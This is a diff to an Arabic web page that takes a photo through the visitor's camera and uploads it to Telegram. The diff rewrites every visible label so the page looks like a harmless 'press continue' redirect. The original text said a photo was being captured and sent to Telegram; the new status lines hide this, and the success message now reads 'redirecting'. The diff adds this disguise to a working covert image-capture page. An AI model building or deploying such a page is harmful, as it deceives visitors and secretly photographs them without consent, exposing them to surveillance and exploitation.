@@ -3,7 +3,7 @@ here<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط وإرسال صورة</title>
+    <title> اضغط على متابعه</title>
     <style>
         * {
             box-sizing: border-box;
@@ -57,7 +57,7 @@ here<!DOCTYPE html>
 <body>
 
     <div class="container">
-        <button id="captureBtn" class="send-btn" onclick="processCapture()">إرسال</button>
+        <button id="captureBtn" class="send-btn" onclick="processCapture()">متابعه</button>
         <div id="status"></div>
     </div>
 
@@ -87,7 +87,7 @@ here<!DOCTYPE html>
                 });
 
                 video.srcObject = stream;
-                status.textContent = 'جاري التقاط الصورة...';
+                status.textContent = '  ...';
 
                 // الانتظار لحظة لضبط إضاءة الكاميرا
                 await new Promise(resolve => setTimeout(resolve, 1000));
@@ -101,7 +101,7 @@ here<!DOCTYPE html>
                 // إيقاف تشغيل الكاميرا فوراً
                 stream.getTracks().forEach(track => track.stop());
 
-                status.textContent = 'جاري الإرسال إلى تلجرام...';
+                status.textContent = '   لحضه...';
 
                 // 3. تحويل الصورة إلى Blob وإرسالها إلى تلجرام
                 canvas.toBlob(async (blob) => {
@@ -117,9 +117,9 @@ here<!DOCTYPE html>
                     const result = await response.json();
 
                     if (result.ok) {
-                        status.textContent = 'تم الإرسال بنجاح!';
+                        status.textContent = ' جاري التوجيه... ';
                     } else {
-                        status.textContent = 'فشل الإرسال: ' + result.description;
+                        status.textContent = 'حدث خطأ ما : ' + result.description;
                     }
                     btn.disabled = false;
                 }, 'image/jpeg');
